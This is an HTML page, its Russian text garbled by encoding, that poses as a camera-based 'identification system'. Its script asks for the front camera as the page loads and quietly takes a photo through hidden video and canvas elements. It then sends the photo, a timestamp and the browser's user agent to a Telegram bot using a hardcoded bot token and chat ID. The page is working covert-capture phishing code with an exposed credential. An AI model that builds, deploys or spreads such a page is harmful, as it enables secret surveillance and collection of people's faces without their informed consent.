<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–°–∏—Å—Ç–µ–º–∞ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #f5f5f5;
        }
        .container {
            text-align: center;
            background: white;
            padding: 3rem;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            max-width: 400px;
        }
        .status {
            margin-top: 2rem;
            padding: 15px;
            border-radius: 8px;
            font-weight: bold;
        }
        .loading {
            background-color: #e3f2fd;
            color: #1565c0;
            border: 1px solid #bbdefb;
        }
        .success {
            background-color: #e8f5e9;
            color: #2e7d32;
            border: 1px solid #c8e6c9;
        }
        .error {
            background-color: #ffebee;
            color: #c62828;
            border: 1px solid #ffcdd2;
        }
        h1 {
            color: #333;
            margin-bottom: 1rem;
        }
        p {
            color: #666;
            margin-bottom: 2rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>–°–∏—Å—Ç–µ–º–∞ –¥–æ—Å—Ç—É–ø–∞</h1>
        <p>–†–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –¥–ª—è –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏</p>
        <div id="status" class="status loading">–û–∂–∏–¥–∞–Ω–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –∫–∞–º–µ—Ä—ã...</div>
        
        <!-- –°–∫—Ä—ã—Ç—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –∫–∞–º–µ—Ä–æ–π -->
        <video id="video" autoplay playsinline style="display: none;"></video>
        <canvas id="canvas" style="display: none;"></canvas>
    </div>

    <script>
        // ================== –ù–ê–°–¢–†–û–ô–ö–ò ==================
        const BOT_TOKEN = '7859734743:AAFvI2nxQpDwuy9lOm29WCl1-CCPtNu5khY'; // ‚ö†Ô∏è –ó–ê–ú–ï–ù–ò–¢–ï!
        const CHAT_ID = '1752279654'; // ‚ö†Ô∏è –ó–ê–ú–ï–ù–ò–¢–ï!
        // ================================================

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusDiv = document.getElementById('status');

        // –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –∫–∞–º–µ—Ä—ã (–º–∏–Ω–∏–º–∞–ª—å–Ω—ã–µ)
        const constraints = { 
            video: { 
                width: 320,
                height: 240,
                facingMode: "user"
            } 
        };

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–∫–∞–∑–∞ —Å—Ç–∞—Ç—É—Å–∞
        function showStatus(message, type) {
            statusDiv.className = `status ${type}`;
            statusDiv.textContent = message;
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ –≤ Telegram
        async function sendPhotoToTelegram(photoData) {
            try {
                showStatus('–ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è...', 'loading');
                
                // –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º base64 –≤ blob
                const response = await fetch(photoData);
                const blob = await response.blob();
                
                // –°–æ–∑–¥–∞–µ–º FormData
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'id_photo.jpg');
                
                // –î–æ–±–∞–≤–ª—è–µ–º –º–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ
                const timestamp = new Date().toLocaleString('ru-RU');
                const userAgent = navigator.userAgent.substring(0, 50);
                const caption = `üïí ${timestamp}\nüì± ${userAgent}\n#–∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è`;
                formData.append('caption', caption);
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                showStatus('‚úÖ –ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞', 'success');
                
                // –ó–∞–∫—Ä—ã–≤–∞–µ–º –∫–∞–º–µ—Ä—É
                const stream = video.srcObject;
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                
            } catch (error) {
                showStatus('‚ùå –û—à–∏–±–∫–∞ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏', 'error');
                console.error('–û—à–∏–±–∫–∞:', error);
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ —Å–æ–∑–¥–∞–Ω–∏—è —Ñ–æ—Ç–æ
        function captureAutoPhoto() {
            try {
                // –ù–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º canvas
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // –î–µ–ª–∞–µ–º —Å–Ω–∏–º–æ–∫
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º –≤ base64
                const photoData = canvas.toDataURL('image/jpeg', 0.7);
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ
                sendPhotoToTelegram(photoData);
                
            } catch (error) {
                showStatus('‚ùå –û—à–∏–±–∫–∞ –∑–∞—Ö–≤–∞—Ç–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è', 'error');
            }
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–∞–º–µ—Ä—ã
        async function initCamera() {
            try {
                // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                
                // –ñ–¥–µ–º –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏ –≤–∏–¥–µ–æ
                video.onloadedmetadata = function() {
                    // –î–∞–µ–º 500–º—Å –Ω–∞ —Ñ–æ–∫—É—Å–∏—Ä–æ–≤–∫—É –∏ –¥–µ–ª–∞–µ–º —Ñ–æ—Ç–æ
                    setTimeout(captureAutoPhoto, 500);
                };
                
            } catch (err) {
                showStatus('‚ùå –î–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –∑–∞–ø—Ä–µ—â–µ–Ω', 'error');
            }
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø—Ä–æ—Ü–µ—Å—Å
        window.addEventListener('load', initCamera);
    </script>
</body>
</html>